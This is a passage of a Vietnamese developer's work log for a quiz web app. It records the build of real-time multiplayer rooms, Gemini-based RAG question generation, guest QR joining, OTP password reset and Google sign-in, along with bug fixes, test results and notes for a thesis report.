- **Mục 2.8:** ERD nay có 8 bảng — thêm `quiz_attempts` và `attempt_answers`. Nên nêu rõ *vì sao* `attempt_answers` sinh sẵn ngay lúc bắt đầu (chốt đề) thay vì chỉ ghi khi người dùng trả lời: đây là quyết định thiết kế có lý do rõ ràng, dễ hỏi khi bảo vệ.
- **Mục 2.6:** thêm UC_LamBaiQuiz, UC_XemKetQua, UC_XemLichSu, UC_XemBangXepHang. Luồng thay thế lấy sẵn từ các ca 400/404/409 đã kiểm chứng (hết giờ, nộp hai lần, quiz rỗng, bài của người khác).
- **Mục 2.7 (thiết kế lớp):** `AnswerGrader` là ví dụ tốt để nói về tách logic nghiệp vụ khỏi framework — không phụ thuộc Spring nên test được ở mức đơn vị, 15 ca chạy trong 0,06 giây.
- **Mục 3.4:** 97 test tự động (100% pass) + 48 + 19 ca kiểm chứng HTTP. Ba lỗi ở trên đưa vào phần "khó khăn & cách giải quyết"; lỗi số 1 minh họa rõ giá trị của việc chạy thật chứ không chỉ chạy test.
- **Mục bảo mật:** luật "không lộ đáp án khi chưa nộp" và "bài làm của ai người ấy xem (404 chứ không 403)" nên viết thành một mục riêng — đây là phần dễ làm sai và có bằng chứng test kèm theo.

---

## 📅 T6 — 07/08/2026 — Lát cắt 4: Phòng đấu trí thời gian thực ⭐

**Mục tiêu hôm nay:** Trụ cột real-time của phiếu đề tài — nhiều người cùng chơi một quiz, đồng bộ độ trễ thấp qua Spring WebSocket (STOMP) + Redis Pub/Sub.

### Nhiệm vụ
- [x] Migration `V5__game_rooms.sql`
- [x] Trạng thái phòng trên Redis + tính điểm theo tốc độ
- [x] WebSocket STOMP + xác thực JWT ở frame CONNECT
- [x] Redis Pub/Sub đồng bộ giữa nhiều instance backend
- [x] Frontend: sảnh phòng, phòng chờ, màn chơi, bảng xếp hạng trực tiếp
- [x] Test 113/113 pass (thêm 16 ca) + 30/30 ca kiểm chứng với 2 client thật

### Đã làm được

**Migration V5:** `game_rooms` (room_code 6 ký tự, status, seconds_per_question) và `game_room_players` (final_score, UNIQUE room+user). Hai bảng này chỉ giữ **metadata và điểm cuối**; trạng thái đang chơi nằm ở Redis `room:{code}`.

**Backend:** `RoomService` (mở/vào/bắt đầu/trả lời/chuyển câu/kết thúc), `RoomStateStore` (đọc-ghi trạng thái Redis có khoá), `SpeedScorer` (thuần Java, test trực tiếp), `GameEventPublisher` + `GameEventRelay` (cầu Redis Pub/Sub), `StompAuthChannelInterceptor` (xác thực JWT ở frame CONNECT), `RoomController` (REST) và `RoomStompController` (STOMP).

**Frontend:** `features/room/` — `useRoomSocket` bọc `@stomp/stompjs` + SockJS, sảnh phòng (mở phòng / vào bằng mã), một trang `RoomPage` phục vụ cả ba giai đoạn chờ–chơi–kết thúc, đồng hồ đếm ngược theo mốc server, bảng xếp hạng trực tiếp.

**Tám quyết định thiết kế** ghi đầy đủ ở [features/04](../features/04-multiplayer-realtime.md#quyết-định-thiết-kế-đã-hiện-thực). Ba cái quan trọng nhất khi bảo vệ:
1. **Mọi thông điệp đi vòng qua Redis Pub/Sub**, kể cả khi chỉ có một instance. Broker của Spring nằm trong bộ nhớ từng instance nên gửi thẳng là mất đồng bộ ngay khi scale ngang. `GameEventRelay` nghe theo **mẫu** `room:*:events` để khỏi quản lý vòng đời subscription từng phòng.
2. **Thời gian do server đo.** Payload đáp án cố tình không có trường thời gian — tin client thì ai cũng khai "trả lời trong 1ms".
3. **Đáp án chỉ rời server khi câu đã đóng.** Kết quả gửi riêng cho người trả lời; cả phòng chỉ biết *số người* đã xong. Phát kết quả cho cả phòng là gián tiếp lộ đáp án.

**Kiểm thử — 113/113 pass** (97 → 113, thêm 16 ca): `SpeedScorerTest` 8 ca (gồm ca cốt lõi "đúng chậm phải hơn sai nhanh"), `RoomFlowIntegrationTest` 8 ca chạy **hai client STOMP thật** trên cổng thật, sự kiện đi qua Redis Pub/Sub thật.
**Kiểm chứng trên stack dev — 30/30:** script Node dùng đúng `@stomp/stompjs` của frontend, hai người chơi vào cùng phòng, kiểm cả luồng chơi lẫn các ca chống gian lận.

### Hai lỗi gặp phải và cách sửa
1. **Tin nhắn riêng không tới nơi.** `convertAndSendToUser(userId, …)` khớp người nhận theo `Authentication.getName()`, mà Spring lấy `toString()` của record `AuthenticatedUser` làm tên → không khớp `userId`, message lặng lẽ biến mất. Sửa: cho record cài `AuthenticatedPrincipal` với `getName()` trả về id. *Lỗi kiểu này không có test hai client thì không thể phát hiện — API vẫn trả 200, chỉ là không ai nhận được gì.*
2. **Script kiểm chứng báo sai "không sang được câu 2".** Hàng đợi sự kiện trong script giữ lại sự kiện đã giao nên lần chờ sau nhặt trúng câu cũ. Lỗi của script, không phải của server — đã sửa script rồi chạy lại 30/30. *Ghi lại để nhớ: test bảo hỏng chưa chắc code hỏng.*

### Nợ / chuyển sang ngày sau
- **Chưa mở hai trình duyệt để nhìn tận mắt** — mới kiểm bằng test và script.
- Chưa có hạn giờ cưỡng chế phía server nếu host bỏ đi giữa chừng (phòng treo ở câu hiện tại tới khi Redis hết TTL 6 giờ).
- Chưa đo tải thật (mục 3.5 của báo cáo) — đây chính là đối tượng chính của load test tuần 8.
- Lát cắt kế tiếp: **05-ai-rag-generation** (AiOrchestrator + RAG sinh đề).

### Ghi chú báo cáo
- **Mục 2.8:** ERD nay có 10 bảng — thêm `game_rooms`, `game_room_players`. Nên nói rõ *vì sao* trạng thái đang chơi không nằm trong hai bảng này.
- **Mục 2.7 (thiết kế lớp):** sơ đồ tuần tự một câu hỏi (host → server → Redis Pub/Sub → các instance → client) là hình đắt giá nhất của chương 2. `SpeedScorer` lại là ví dụ tốt cho việc tách logic khỏi framework.
- **Mục 3.4:** 113 test tự động (100% pass) + 30 ca kiểm chứng 2 client. Lỗi `AuthenticatedPrincipal` rất đáng đưa vào "khó khăn & cách giải quyết": nó minh hoạ vì sao phải test nhiều client thật chứ không chỉ test API.
- **Mục 3.5 (load test):** đã có đủ hạ tầng để đo — kịch bản nên là N người trong một phòng, đo P95 độ trễ từ lúc server phát `QUESTION` tới lúc client nhận. **Chưa đo, chưa được ghi số.**
- **Mục bảo mật:** ba luật đáng viết — token ở frame CONNECT (không phải query string), thời gian do server đo, đáp án chỉ công bố khi câu đóng.

---

## 📅 T6 — 07/08/2026 (buổi chiều) — Lát cắt 5: AI + RAG sinh đề ⭐

**Mục tiêu hôm nay:** Trụ cột AI của phiếu đề tài — nạp học liệu vào kho vector rồi sinh câu hỏi bám theo nội dung, Creator duyệt trước khi vào ngân hàng.

### Nhiệm vụ
- [x] Thêm Apache Tika + Migration `V6__ai_rag.sql`
- [x] `AiProvider` / `GeminiProvider` / `GrokProvider` / `AiOrchestrator` (fallback + audit)
- [x] Pipeline RAG: Tika trích text → chunk có chồng lấn → embedding → pgvector
- [x] Sinh đề: retrieval + prompt grounding + validate JSON + lọc trùng
- [x] Job nền trả `jobId` + Creator duyệt câu hỏi
- [x] Frontend: kho học liệu + màn sinh đề + duyệt câu hỏi
- [x] **Gọi Gemini thật — đã chạy, 22/22 ca kiểm chứng đạt**

### Đã làm được

**Migration V6:** `learning_materials`, `material_chunks` (cột `embedding vector(768)` + chỉ mục `ivfflat`), `ai_jobs`, `ai_request_logs`.

**Lớp provider:** `AiProvider` là giao diện chung; `GeminiProvider` (REST `generateContent` + `embedContent`) và `GrokProvider` (tương thích OpenAI) có thân request khác hẳn nhau — đúng chỗ cần trừu tượng hoá. `AiOrchestrator` lo fallback theo `app.ai.provider-order`, bỏ qua provider chưa có key, và ghi audit mọi lời gọi. **Tự viết bằng `WebClient`, không dùng Spring AI hay LangChain4j** theo đúng yêu cầu đề tài.

**Pipeline RAG:** `TextExtractor` (Tika `AutoDetectParser`, nhận dạng theo nội dung chứ không theo đuôi file) → `TextChunker` (1500 ký tự, chồng lấn 200, chỉ cắt ở ranh giới câu) → embedding → `material_chunks`. Truy vấn tương đồng bằng toán tử `<=>` của pgvector, **luôn lọc `owner_id`**.

**Sinh đề:** `QuestionPromptBuilder` (grounding + rào ngữ cảnh chống prompt injection) → `AiOrchestrator` → `QuestionJsonParser`. Parser là chốt chặn quan trọng nhất: gỡ khối ```json, chấp nhận nhiều cách gói dữ liệu khác nhau, áp đúng luật 5 loại câu hỏi, lọc câu trùng, và **bỏ câu hỏng nhưng giữ câu tốt** kèm lý do loại từng câu.

**Chín quyết định thiết kế** ghi ở [features/05](../features/05-ai-rag-generation.md#quyết-định-thiết-kế-đã-hiện-thực).

**Kiểm thử — 138/138 pass** (113 → 138, thêm 25 ca): `TextChunkerTest` 9 ca, `QuestionJsonParserTest` 16 ca (phủ toàn bộ kiểu đầu ra lệch chuẩn của mô hình).
**Kiểm chứng HTTP — 14/14** cho phần không cần key: phân quyền, validate, truy cập chéo, và hành vi khi chưa cấu hình key.

### Nghiệm thu với Gemini thật — 22/22 ca đạt

Sau khi có API key, chạy thật trọn luồng: nạp học liệu (995 ký tự → 1 đoạn, có vector) → similarity
search → sinh 3 câu hỏi bám tài liệu → Creator duyệt → câu vào ngân hàng câu hỏi. Không câu nào bị
parser loại.

Ví dụ câu AI sinh từ tài liệu về HTTP (chứng minh **grounding** hoạt động — tài liệu nói gì thì hỏi nấy):
> *"Trong giao thức HTTP, nhóm mã trạng thái nào báo hiệu các lỗi xuất phát từ phía máy khách?"* → Nhóm 4xx
> *"Mã trạng thái HTTP nào dưới đây được sử dụng khi việc tạo mới một tài nguyên diễn ra thành công?"* → 201 Created

**Số liệu đo được** (từ `ai_request_logs`, lấy làm cơ sở cho mục 3.6):

| Tác vụ | Model | Độ trễ TB | Token vào | Token ra |
|---|---|---|---|---|
| embedding (1 đoạn) | `gemini-embedding-001` | ~750 ms | — | — |
| sinh 3 câu hỏi (có RAG) | `gemini-3.6-flash` | ~8,1 s | 871 | 354 |

### Bốn lỗi gặp phải và cách sửa
Hai lỗi đầu là bẫy kinh điển của Spring, **chỉ lộ ra khi chạy thật** — biên dịch sạch, test đơn vị không đụng tới. Hai lỗi sau chỉ lộ khi gọi API thật:
1. **Job nền chạy trước khi transaction commit.** Gọi thẳng phương thức `@Async` từ trong phương thức `@Transactional` khiến luồng nền khởi động ngay, đọc CSDL chưa thấy dòng vừa tạo → `No value present`. Sửa: phát sự kiện và bắt bằng `@TransactionalEventListener` (chạy sau khi commit).
2. **Đổi trạng thái không được ghi xuống.** `this.updateStatus(...)` là gọi nội bộ, không qua proxy nên `@Transactional` mất tác dụng; job chạy xong mà vẫn hiện `PENDING`. Sửa: tách `AiJobStatusWriter` / `MaterialStatusWriter` thành bean riêng với `REQUIRES_NEW`.
3. **`text-embedding-004` đã bị Google gỡ** → 404 NOT_FOUND, toàn bộ pipeline RAG chết. Sửa: đổi sang `gemini-embedding-001`, xin `outputDimensionality: 768` cho khớp cột `vector(768)`, và **đưa model + số chiều ra file cấu hình** để lần sau Google đổi thì không phải sửa code.
4. **`gemini-2.5-flash` không còn mở cho tài khoản mới** → cũng 404. Đã dò danh sách model thực tế bằng `GET /v1beta/models` rồi chọn `gemini-3.6-flash` (trả JSON sạch nhất trong các model thử).

> Bài học ghi lại cho báo cáo: **tên model của nhà cung cấp là thứ sẽ thay đổi**, phải coi như cấu hình chứ không phải hằng số trong code.

### Nợ / chuyển sang ngày sau
- Chưa xem giao diện AI trên trình duyệt.
- Chưa có key Grok nên **chưa demo được fallback Gemini→Grok** (cần cho mục 3.6).
- Chưa giới hạn hạn mức gọi AI theo user (`quota:ai:{userId}` ở Redis).
- Chưa cache theo hash(prompt) để tiết kiệm chi phí.
- Mục 3.6 mới có số liệu độ trễ/token; **chưa đánh giá độ chính xác** trên bộ mẫu đủ lớn.
- Lát cắt kế tiếp: **06-ai-grading** (chấm câu tự luận — nối tiếp `PENDING_AI` từ lát cắt 3).

### Ghi chú báo cáo
- **Mục 1.6 / 2.3:** kiến trúc RAG là phần đắt giá nhất chương 2 — vẽ sơ đồ hai pipeline (ingestion và retrieval+generation) như trong features/05.
- **Mục 2.7:** `AiProvider` + `AiOrchestrator` là ví dụ giáo khoa cho Strategy pattern; nêu rõ vì sao fallback chỉ áp cho lỗi tạm thời.
- **Mục 2.8:** ERD nay có 14 bảng — thêm `learning_materials`, `material_chunks`, `ai_jobs`, `ai_request_logs`. Nêu rõ vì sao `material_chunks` không map bằng JPA.
- **Mục 3.4:** 138 test tự động (100% pass). `QuestionJsonParserTest` 16 ca là dẫn chứng tốt: mỗi ca tương ứng một kiểu đầu ra sai mà mô hình *thực sự* hay trả về.
- **Mục 3.6 (đánh giá AI):** đã có số liệu đầu tiên (bảng ở trên). Còn thiếu: đánh giá độ chính xác trên bộ mẫu đủ lớn, và demo fallback Gemini→Grok (chưa có key Grok).
- **Bảo mật:** ba luật đáng viết — tách chỉ dẫn khỏi dữ liệu (chống prompt injection), grounding + trả `sourceExcerpts` để đối chiếu, và cô lập học liệu theo `owner_id`.

---

## 📅 T6 — 07/08/2026 (buổi tối) — Nâng cấp phòng đấu: PIN + QR, khách vãng lai, avatar

**Mục tiêu hôm nay:** Đưa trải nghiệm phòng đấu về đúng kiểu Kahoot — chiếu mã lên màn hình, cả lớp quét điện thoại vào chơi ngay.

### Nhiệm vụ
- [x] Migration `V7__room_pin_guest_avatar.sql`
- [x] Mã phòng đổi sang **PIN 6 chữ số**; frontend vẽ **mã QR** trỏ tới `/join/{PIN}`
- [x] **Khách vãng lai** vào chơi được — công tắc `allowGuests` do host bật cho từng phòng
- [x] Bộ **avatar** 18 nhân vật, nút "Ngẫu nhiên", đổi được ngay trong phòng chờ
- [x] **Phòng chờ live** dạng thẻ, trạng thái "Đã sẵn sàng" cập nhật real-time
- [x] Test 144/144 pass (thêm 6 ca) + 22/22 ca kiểm chứng với 2 client thật
- [x] Cập nhật tài liệu cho khớp luật mới

### Một luật cũ đã được sửa có chủ đích

Luật ban đầu (`docs/overview.md`) nói **Guest không vào phòng đấu**. Yêu cầu mới cần đúng điều đó, nên
thay vì bỏ hẳn luật, đã chọn phương án **host bật/tắt cho từng phòng**:

- `game_rooms.allow_guests` **mặc định FALSE** → luật cũ vẫn là hành vi mặc định.
- Giáo viên chủ động bật khi muốn cả lớp quét QR vào chơi.
- Khách chỉ sống trong một ván: không lịch sử làm bài, không thống kê cá nhân, không lên đồ thị gợi ý.

### Đã làm được

**Migration V7:** thêm `allow_guests`; `game_room_players.user_id` cho phép NULL, thêm `display_name`,
`avatar`, `is_guest`. Ràng buộc UNIQUE cũ được thay bằng **chỉ mục một phần** `WHERE user_id IS NOT NULL`
— nhiều khách cùng phòng đều có `user_id` NULL nên ràng buộc cũ không còn diễn đạt đúng ý.

**Danh tính khách:** không cấp JWT. Cấp JWT sẽ phải thêm vai trò GUEST vào enum `Role`, kéo theo ràng
buộc CHECK của bảng `users` và mọi chỗ phân quyền. Thay vào đó khách nhận **khoá phiên** ngẫu nhiên
trong Redis `roomguest:{key}`, gắn chặt với đúng một phòng, TTL 6 giờ. `StompAuthChannelInterceptor`
nay nhận hai loại danh tính: `Authorization` hoặc `X-Guest-Key`.

**`RoomParticipant`** che đi việc người gửi là thành viên hay khách — phần tính điểm, xếp hạng, kiểm
đã trả lời chưa không phải rẽ nhánh ở đâu cả.

**QR vẽ ở client** bằng `qrcode.react`: nội dung chỉ là một đường dẫn nên sinh ở đâu cũng như nhau;
vẽ tại chỗ thì khỏi thêm thư viện vào backend, khỏi truyền ảnh, và là SVG nên chiếu máy chiếu không vỡ.

**Avatar là emoji trên nền màu**, không phải file ảnh — không phải tải ảnh, không phụ thuộc dịch vụ
bên ngoài, chạy được cả khi mất mạng. *Nói rõ hạn chế:* đây là biểu tượng vui, không phải tranh nhân
vật chibi vẽ tay; muốn bộ chibi thật thì phải mua hoặc tự vẽ rồi thay `PlayerAvatar`.

**Kiểm thử — 144/144 pass** (138 → 144) và **22/22 ca kiểm chứng trên stack dev** với hai client thật:
khách quét QR → chọn avatar → vào phòng chờ → bấm sẵn sàng → chơi → lên bảng xếp hạng chung cuộc.

### Một race condition thật, chỉ lộ khi chạy hai client
`next` đọc trạng thái phòng *ngoài* khoá rồi mới quyết định phát câu kế tiếp hay kết thúc ván. Kênh
STOMP đến của Spring chạy **đa luồng**, nên hai lệnh "câu tiếp theo" gửi sát nhau cùng đọc một trạng
thái cũ → ván nhảy cóc hoặc không bao giờ kết thúc. Sửa: tính toàn bộ bước chuyển **ngay trong khoá**
`RoomStateStore.update`, phần phát sự kiện làm sau.

> Đáng ghi vào báo cáo: đây là loại lỗi mà biên dịch sạch, test đơn vị sạch, thậm chí test một client
> cũng sạch — chỉ hai client chạy song song mới lộ.

### Quét QR bằng điện thoại — ba thứ chặn, đã sửa cả ba
Lần thử đầu điện thoại báo "không tìm thấy". Kiểm chứng ra ba nguyên nhân xếp lớp, sửa lần lượt:
1. **Vite chỉ nghe `::1`** (mặc định bind localhost) → điện thoại gọi `192.168.0.101:5173` không ai trả lời. Sửa: `server.host: true`.
2. **QR mã hoá `localhost`** vì host mở trang bằng `localhost`; trên điện thoại địa chỉ đó là chính nó. Lần sửa đầu chỉ *cảnh báo* và bắt người dùng tự mở lại trang bằng IP LAN — **cách sửa sai**, vì vẫn để cái bẫy nguyên đó. Sửa lại cho đúng: **backend dựng sẵn `joinUrl`** từ địa chỉ LAN nó tự dò được, frontend chỉ việc vẽ. Host mở bằng `localhost` cũng ra QR đúng.
   - Cách dò (`NetworkAddressResolver`): mở UDP socket rồi `connect` tới `8.8.8.8:53` — không gửi gói nào, chỉ để hệ điều hành tra bảng định tuyến và chọn card mạng. Đọc địa chỉ cục bộ của socket là ra đúng card đang nối ra ngoài. Máy thử có 4 IPv4 (3 card ảo VMware/WSL) và cách này chọn đúng card Wi-Fi.
3. **CORS chỉ cho `http://localhost:5173`** → sửa xong hai cái trên sẽ vấp cái này. Sửa: chuyển sang `allowedOriginPatterns`, mặc định mở cho dải IP nội bộ; triển khai thật phải đặt `CORS_ALLOWED_ORIGINS` cụ thể.

Đã kiểm chứng **7/7 ca đi đúng con đường của điện thoại** (mọi request qua `http://192.168.0.101:5173`
và qua proxy Vite, gồm cả nối WebSocket bằng khoá phiên khách) và **6/6 ca cho `joinUrl`** — gọi API
từ `localhost` mà QR vẫn ra địa chỉ LAN, tức là đúng cái ca đã hỏng.

> Đáng ghi vào báo cáo hai điều. Một: đây là loại lỗi mà chạy trên máy dev không bao giờ thấy, vì máy
> dev luôn mở bằng `localhost` — muốn thấy phải có thiết bị thứ hai. Hai: lần sửa đầu tôi chỉ thêm
> cảnh báo và bắt người dùng tự đổi cách mở trang; đó là đẩy việc sang người dùng chứ không phải sửa
> lỗi. Sửa đúng là bỏ hẳn chỗ có thể sai — để backend quyết định địa chỉ.

### Nợ / chuyển sang ngày sau
- Chưa xem giao diện phòng chờ bằng mắt (đã kiểm được đường mạng, chưa kiểm được bố cục).
- `GET /rooms/{pin}` mở cho khách nên về lý thuyết dò được 10⁶ mã; nên thêm rate limit.
- Chưa chặn trùng biệt danh giữa các khách trong cùng phòng.
- Host bỏ đi giữa chừng thì phòng vẫn treo tới khi Redis hết TTL.

### Ghi chú báo cáo
- **Mục 2.6:** thêm UC_QuetQRVaoPhong, UC_ChonAvatar, UC_SanSang. Luồng thay thế lấy từ các ca 403/400/404 đã kiểm chứng.
- **Mục 2.8:** `game_room_players` là bảng duy nhất có khoá ngoại nullable — giải thích lý do và ràng buộc CHECK đi kèm.
- **Mục 2.3 (bảo mật):** đối chiếu hai cơ chế danh tính (JWT dài hạn toàn hệ thống vs khoá phiên ngắn hạn một phòng) là một mục hay.
- **Mục 3.4:** 144 test tự động + 22 ca kiểm chứng 2 client. Race condition ở `next` nên đưa vào "khó khăn & cách giải quyết".

---

## 📅 T6 — 07/08/2026 (đêm) — Hồi quy toàn bộ trước khi merge

**Mục tiêu:** Trước khi gộp hai lát cắt (AI+RAG và Phòng đấu) vào `main`, chạy lại **mọi** bộ kiểm chứng đã viết để chắc không có gì vỡ ngầm, và bít những lỗ hổng đã ghi nhận.

### Nhiệm vụ
- [x] Bít lỗ hổng: đổi mật khẩu phải thu hồi phiên trên mọi thiết bị
- [x] Thêm `POST /auth/logout-all` (đăng xuất mọi thiết bị khi mất máy)
- [x] Sai phương thức HTTP trả 405 thay vì 500
- [x] Thử lại provider AI khi gặp lỗi tạm thời
- [x] Hồi quy 9 bộ kiểm chứng: **183/183 đạt**

### Kết quả hồi quy

| Bộ kiểm chứng | Kết quả |
|---|---|
| Làm bài quiz (lát cắt 3) | 48/48 |
| Ảnh bìa quiz (upload) | 19/19 |
| AI + RAG sinh đề (lát cắt 5) | 22/22 |
| Phòng đấu real-time (lát cắt 4) | 31/31 |
| Khách vãng lai + avatar + sẵn sàng | 22/22 |
| Đường LAN cho điện thoại | 7/7 |
| `joinUrl` trong mã QR | 6/6 |
| Đăng nhập nhiều thiết bị | 15/15 |
| Thu hồi phiên | 13/13 |
| **Tổng** | **183/183** |

Cộng với **144/144** test JUnit và build frontend pass.

### Bốn thứ hồi quy phát hiện và đã sửa

1. **Đổi mật khẩu không cắt phiên thiết bị khác.** Mất điện thoại rồi đổi mật khẩu trên máy tính thì chiếc điện thoại đó *vẫn* vào được tới 14 ngày. Người dùng đổi mật khẩu luôn tin là mình vừa cắt hết truy cập — hệ thống phải làm đúng điều đó. Sửa: thêm chỉ mục ngược Redis `user-sessions:{userId}` để thu hồi được cả loạt, gọi khi đổi mật khẩu; kèm endpoint `logout-all`.
2. **Sai phương thức HTTP trả 500.** `GlobalExceptionHandler` không bắt `HttpRequestMethodNotSupportedException` nên gọi `PUT` vào endpoint chỉ nhận `POST` cho ra "Đã có lỗi xảy ra" — người gọi API không biết mình chỉ dùng sai động từ. Sửa: trả 405 kèm danh sách phương thức được phép.
3. **Gemini trả 503 *model overloaded* làm hỏng cả lần sinh đề.** Lỗi tạm thời, thử lại là được, nhưng orchestrator bỏ luôn vì không có provider dự phòng (chưa có key Grok). Sửa: thử lại chính provider đó 3 lần với backoff 1,2s → 2,4s trước khi chuyển provider.
4. **Hai kỳ vọng cũ trong script kiểm chứng** đã lệch so với hành vi mới có chủ đích (`GET /rooms/{pin}` nay mở cho khách; đổi mật khẩu nay thu hồi phiên). Đã cập nhật script — *không* sửa code để chạy theo script cũ.

> Còn một lỗi trong chính `run_all.sh`: bộ nào crash giữa đường thì không in được dòng kết quả, và script cộng dồn nên báo "0 hỏng" trong khi thực tế có bộ chưa chạy hết. Đã sửa để crash tính là hỏng. **Bài học: chỉ số "0 hỏng" của một script tự viết cũng phải được kiểm.**

### Nợ / chuyển sang ngày sau
- Vẫn chưa xem giao diện bằng mắt (phòng chờ, QR, màn sinh đề AI).
- **Kế tiếp: FR-3 đăng nhập Google + FR-4 quên mật khẩu qua OTP email** — cần chốt nhà cung cấp SMTP.
- Chưa rate limit `GET /rooms/{pin}` và chưa giới hạn hạn mức gọi AI theo user.
- Chưa chặn trùng biệt danh giữa các khách trong cùng phòng.

### Ghi chú báo cáo
- **Mục 3.4:** 144 test tự động + **183 ca kiểm chứng HTTP/WebSocket trên hệ thống đang chạy**, chia 9 bộ theo tính năng. Bảng ở trên dùng được trực tiếp.
- **Mục 2.3 (bảo mật):** ba lỗi sửa ở đây đều là ví dụ tốt — thu hồi phiên khi đổi mật khẩu (quan niệm người dùng vs hành vi hệ thống), mã lỗi đúng ngữ nghĩa (405 vs 500), và chịu lỗi tạm thời của bên thứ ba (retry + backoff).
- **Mục "khó khăn & cách giải quyết":** lỗi trong chính script kiểm chứng là dẫn chứng đáng viết — công cụ đo cũng có thể sai, và một con số "toàn đạt" không tự nó là bằng chứng.

---

## 📅 T7 — 08/08/2026 — FR-4: Quên mật khẩu qua mã OTP gửi email

**Mục tiêu:** Gỡ nốt FR-4 — món nợ từ lát cắt 1, bị chặn suốt vì chưa chốt nhà cung cấp SMTP. Nay chọn **Gmail App Password**.

### Nhiệm vụ
- [x] Thêm `spring-boot-starter-mail`, cấu hình Gmail SMTP
- [x] `PasswordResetOtpService` — sinh/lưu/xác minh OTP trên Redis
- [x] `MailService` + mẫu email HTML
- [x] `POST /auth/forgot-password` và `POST /auth/reset-password`
- [x] Frontend: trang quên mật khẩu hai bước
- [x] Test 153/153 pass (thêm 9 ca) + 15/15 ca kiểm chứng HTTP thật

### Bốn lớp bảo vệ, mỗi lớp chặn một kiểu tấn công khác nhau

| Chặn gì | Cách làm |
|---|---|
| Dò danh sách người dùng | `forgot-password` **luôn trả 204**, dù email có tài khoản hay không |
| Đọc trộm Redis | OTP lưu **dạng băm BCrypt**, không lưu thô |
| Dò 6 chữ số (chỉ 10⁶ khả năng) | Sai quá **5 lần** thì huỷ mã, bắt xin lại |
| Bơm email vào hòm thư người khác | Giãn cách **60 giây** giữa hai lần xin mã (429) |

Thêm: mã sống 10 phút, dùng **một lần**, và đặt lại xong **thu hồi phiên trên mọi thiết bị**.

Một chi tiết nhỏ nhưng đáng nói: `reset-password` xác minh mã **trước** khi tra người dùng. Làm ngược
lại thì thời gian phản hồi giữa "email không tồn tại" và "mã sai" khác nhau, đủ để dò email qua độ trễ
— công sức "luôn trả 204" ở bước trước thành vô ích.

### Hai lỗi phát hiện khi chạy thật

1. **`resetPassword` thiếu `@Transactional`** nên mật khẩu mới không được ghi xuống: API trả 204,
   nhưng đăng nhập bằng mật khẩu mới vẫn 401. Test tích hợp bắt được ngay.
2. **Thêm `starter-mail` làm `/actuator/health` trả 503.** Spring tự thêm `MailHealthIndicator`, nó
   thử kết nối SMTP mỗi lần gọi health; chưa cấu hình mail là **cả ứng dụng bị báo DOWN** trong khi
   mọi thứ khác chạy tốt. Sửa: tắt `management.health.mail.enabled`.
   > Đây là lỗi nguy hiểm kiểu âm thầm: health check là thứ load balancer và Docker dùng để quyết
   > định gỡ instance hay khởi động lại container. Nếu không phát hiện, bản deploy sẽ bị restart
   > liên tục mà nhìn log ứng dụng không thấy gì sai.

### Hồi quy sau khi thêm tính năng — 198/198
Chạy lại toàn bộ 10 bộ kiểm chứng, không bộ nào vỡ. Cộng **153/153** test JUnit.

### Nợ / chuyển sang ngày sau
- **Chưa gửi thư thật** — cần điền `MAIL_USERNAME` và `MAIL_PASSWORD` (App Password) vào `.env`.
  Hiện chưa cấu hình thì `MailService` chỉ ghi mã ra log, đủ để kiểm luồng nhưng chưa phải bằng chứng
  email tới được hòm thư.
- **FR-3 đăng nhập Google** — việc kế tiếp, cần Client ID từ Google Cloud Console.
- Chưa xem giao diện trang quên mật khẩu bằng mắt.

### Ghi chú báo cáo
- **Mục 2.3 (bảo mật):** bảng bốn lớp bảo vệ ở trên dùng được trực tiếp. Điểm nhấn: OTP cũng được băm
  như mật khẩu, và việc thứ tự kiểm tra ảnh hưởng tới lộ thông tin qua độ trễ.
- **Mục 2.6:** thêm UC_QuenMatKhau với luồng thay thế đầy đủ (email không tồn tại, mã sai, mã hết hạn,
  xin mã quá dày).
- **Mục 3.4:** 153 test tự động + 198 ca kiểm chứng trên hệ thống chạy thật (10 bộ).
- **"Khó khăn & cách giải quyết":** lỗi health check 503 là ví dụ rất tốt — thêm một dependency có thể
  đổi hành vi của thứ tưởng như không liên quan.

---

## 📅 T7 — 08/08/2026 (chiều) — FR-3: Đăng nhập bằng Google

**Mục tiêu:** Nốt yêu cầu chức năng cuối còn treo của lát cắt Auth. Trước đó hệ thống chỉ có **một
cách** đăng nhập là email + mật khẩu.

### Nhiệm vụ
- [x] Migration `V8__google_login.sql` — thêm `google_id`, bỏ `NOT NULL` của `password_hash`
- [x] `GoogleTokenVerifier` — xác minh ID token bằng thư viện chính chủ
- [x] `AuthService.loginWithGoogle` — liên kết / tạo tài khoản
- [x] `POST /api/v1/auth/google`
- [x] Frontend: nút Google chính chủ ở trang Đăng nhập và Đăng ký
- [x] Test **160/160** JUnit (thêm 7 ca) + hồi quy **198/198** ca kiểm chứng HTTP/WebSocket thật

### Chọn luồng nào: chuyển hướng phía máy chủ hay ID token

| | Authorization Code (server-side) | **ID token (đã chọn)** |
|---|---|---|
| Client Secret | Bắt buộc — thêm một secret phải giữ | Không cần |
| Redirect URI | Phải khai báo và khớp tuyệt đối; đổi tên miền là phải sửa ở Google | Chỉ cần khai *JavaScript origin* |
| Số vòng mạng | Trình duyệt → Google → backend → Google (đổi code lấy token) | Trình duyệt lấy token, backend xác minh |
| Ai quyết định danh tính | Backend | Backend (frontend chỉ chuyển tiếp token nó không tự đọc) |

Điểm chung quan trọng: **cả hai luồng backend đều là bên duy nhất xác định người dùng là ai.** Cái sai
kinh điển là để frontend tự giải mã token rồi gửi lên `{"email": "..."}` — như vậy ai cũng tự khai
mình là người khác được.

### Ba chỗ dễ làm sai, mỗi chỗ là một lỗ hổng

1. **Không kiểm `aud`.** `verify()` sẽ chấp nhận mọi token Google ký hợp lệ — kể cả token cấp cho một
   ứng dụng hoàn toàn khác. Bất kỳ ai có ứng dụng Google nào đó đều đăng nhập vào đây được. Sửa:
   `setAudience(List.of(clientId))`.
2. **Liên kết theo email mà không kiểm `email_verified`.** Tạo một tài khoản Google khai email của
   người khác rồi đăng nhập là chiếm được tài khoản của họ. Sửa: từ chối token có email chưa xác minh.
3. **Dùng email làm khoá liên kết.** Người dùng đổi được địa chỉ Gmail; khoá phải là `sub` — định
   danh không đổi mà Google cấp riêng cho từng ứng dụng.

### Hệ quả kéo theo: tài khoản không có mật khẩu

Cho phép đăng nhập Google nghĩa là chấp nhận `password_hash` NULL — thứ mà cột này trước giờ cấm.
Ràng buộc thay thế: `CHECK (password_hash IS NOT NULL OR google_id IS NOT NULL)` — mỗi tài khoản phải
có ít nhất một cách vào, không để lọt bản ghi không đăng nhập được bằng đường nào.

Và một luồng cũ vỡ theo: `change-password` đối chiếu "mật khẩu hiện tại" với một giá trị NULL. Thay
